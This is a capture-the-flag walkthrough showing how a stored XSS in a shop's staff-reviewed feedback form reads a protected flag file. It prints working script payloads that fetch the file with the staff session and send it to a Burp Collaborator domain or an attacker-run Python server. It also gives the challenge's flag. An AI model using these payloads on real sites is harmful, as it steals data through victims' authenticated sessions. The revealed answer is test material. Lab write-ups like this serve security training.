## 🧾 Overview
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
Can you read the flag at http://MACHINE_IP:8080/flag.txt?

## 🔍 Recon
I started the machine and visited the URL given. \
Got hit with a 401 Unauthorized. The file exists, I just can't access it.

So I started poking around the website and found two main pages:
1. Homepage - Just some cat images, nothing interesting
2. Feedback page - Where you can submit feedback

But here's the kicker: there's a notice saying "Feedback is reviewed manually by staff". That immediately got my attention 👀\
Submission forms are vulnerable to XSS attacks. So let's give it a try.

## 🛡️Testing for XSS with Burp Collaborator
First, I needed to confirm if XSS actually works. The problem is, the staff probably uses some automated bot (headless browser) to review feedback, so I can't just use <script>alert(1)</script> and expect to see a pop-up.\
I needed proof that my JavaScript executed on their end.

Here's what I did:
1. Fired up Burp Suite and went to Burp → Burp Collaborator client
2. Clicked "Copy to clipboard" - this gave me a unique domain like
```bash
w0xysci7ol1e9r3bdvouyf3zxq3hr9fy.oastify.com
```
3. Left that window open so I could monitor incoming connections

Then I crafted a simple test payload:
```bash
<script>fetch('https://w0xysci7ol1e9r3bdvouyf3zxq3hr9fy.oastify.com?test=xss')</script>
```
Submitted it in the feedback form, waited about 30 seconds\
Boom! 💥 I saw DNS queries hitting my Collaborator domain. This confirmed:\
✅ XSS works\
✅ Staff's browser executed my code\
✅ I can exfiltrate data

## 🤔Understanding Why I Get 401 (But the Payload Won't)
Here's the thing - when I try to access flag.txt, I'm just a regular user with no special permissions:
```bash
My Browser: "Hey, give me /flag.txt"
Server: "Who are you? Show me your session cookie."
My Browser: "I'm just a regular user"
Server: "Nope. 401 Unauthorized."
```
But when the staff's browser makes the request (through my XSS):
```bash
Staff's Browser: "Hey, give me /flag.txt"
Server: "Who are you? Show me your session cookie."
Staff's Browser: "I'm an admin with proper credentials."
Server: "Here you go! 200 OK"
```
So basically, I'm using the staff's authenticated session to fetch the file for me. They have the VIP pass, I'm just riding along 😎

## 🚀First Attempt - Sending to Collaborator
I tried this payload first:
```bash
<script>
fetch('/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('https://w0xysci7ol1e9r3bdvouyf3zxq3hr9fy.oastify.com?flag=' + btoa(data));
  });
</script>
```
Make sure you use your Burp collaborator-generated domain.

The idea was:
1. Staff's browser fetches /flag.txt (they have access)
2. Encodes it in Base64 (btoa())
3. Sends it to my Collaborator URL

**● But here's where I hit a problem 😩**\
When I checked Collaborator, I only saw DNS queries - no actual HTTP requests with the flag data. The browser was trying to resolve the domain, but couldn't complete the HTTP request. Probably blocked by CSP or some firewall rule.

## ✅The Solution - My Own Local Server
**● Step 1: Starting a Python HTTP server**\
I just ran the basic Python HTTP server:
```bash
python3 -m http.server 4455
```
This starts listening on port 4455.

**● Step 2: Crafting the final payload**
```bash
<script>
fetch('/flag.txt')
  .then(r => r.text())
  .then(data => {
    fetch('http://IP:PORT?flag=' + btoa(data));
  });
</script>
```
Let me break down what each part does:
1. fetch('/flag.txt') - Staff's browser requests the flag file using their admin session
2. .then(r => r.text()) - Converts the response to plain text
3. btoa(data) - Encodes the flag in Base64 (so special characters don't break the URL)
4. fetch('http://IP:PORT?flag=...') - Sends the Base64-encoded flag to MY server

## Catching the Flag 🎣
I submitted the payload in the feedback form and watched my terminal where the Python server was running.
After some seconds, I saw this hit my server:
```bash
10.x.x.x - - [13/Oct/2025 05:35:42] "GET /?flag=ZmxhZ3t4c3NfaXNfcDB3M3JmdWx9 HTTP/1.1" 200 -
```
There it is! The Base64-encoded flag: ZmxhZ3t4c3NfaXNfcDB3M3JmdWx9

**●Step 3: Decoding the flag**
```bash
echo "ZmxhZ3t4c3NfaXNfcDB3M3JmdWx9" | base64 -d
```
Output:
```bash
flag{xss_is_p0w3rful}
```
Got it! 🚩

## Why This Worked
The key here was understanding that:
1. I couldn't access the file directly - 401 error blocked me
2. But the staff reviewing feedback could - they had the right session
3. XSS let me borrow their access - their browser made the request for me
4. Local server bypassed restrictions - internal network traffic was allowed

No fancy tools needed, just basic Python HTTP server and some clever JavaScript.

## Flag captured! Time to submit and move to the next challenge 😤
